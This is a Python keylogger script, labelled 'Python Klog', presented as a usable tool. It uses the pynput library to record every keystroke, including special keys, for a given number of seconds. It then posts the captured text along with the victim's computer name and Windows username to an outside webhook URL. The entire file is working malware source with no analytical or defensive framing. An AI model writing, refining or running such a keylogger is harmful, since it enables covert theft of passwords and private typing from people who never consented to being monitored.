import sys, os, time
from datetime import datetime
from pynput import keyboard
import requests
import argparse


PCNAME = os.environ["COMPUTERNAME"]
USER = os.environ["USERNAME"]

parser = argparse.ArgumentParser(description="Python Klog")
parser.add_argument("runtime", type=float, help="Runtime in seconds")
parser.add_argument("webhook", type=str, help="Webhook URL")

args = parser.parse_args()

webhook_url = args.webhook
runtime_seconds = args.runtime

key_string = ""
program_start = time.time()
end_time = program_start + float(runtime_seconds)

start_dt = datetime.fromtimestamp(program_start).strftime("%m/%d/%Y, %H:%M:%S")


def send_webhook(content):
    data = {"content": content}
    response = requests.post(webhook_url, json=data)
    try:
        response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
        # print(f"Payload delivered successfully, code {response.status_code}.")
    except requests.exceptions.HTTPError as err:
        # print(f"An error occurred: {err}")
        pass


def on_press(key):
    global key_string
    timing = time.time()
    try:
        # Check if the key has a printable character
        if key.char == None:
            pass
        else:
            key_string += f"{key.char}"
        if timing >= end_time:
            return False
    except AttributeError:
        # Handle special keys (e.g., ctrl, alt)
        match key:
            case key.space:
                key_string += "[ ]"
            case key.backspace:
                key_string += "[<-]"
            case _:
                key_string += f"[{str(key).replace('Key.', '').capitalize()}]"


def on_release(key):
    # Stop the listener if Escape is pressed
    timing = time.time()
    if timing >= end_time:
        return False

    if key == keyboard.Key.esc:
        # print(key_string)
        return False


# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
key_lines = key_string.split("[Enter]")
string_w_breaks = ""
for line in key_lines:
    string_w_breaks += f"{line}[⏎]\n"
end_dt = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
intro_len = len(f"[{start_dt} -> {end_dt}]")
breakline = "=" * intro_len
send_webhook(
    f"{breakline}\n[*{start_dt}* **->** *{end_dt}*]\n[PC: **{PCNAME}** | User: **{USER}**]\n```{string_w_breaks}```"
)
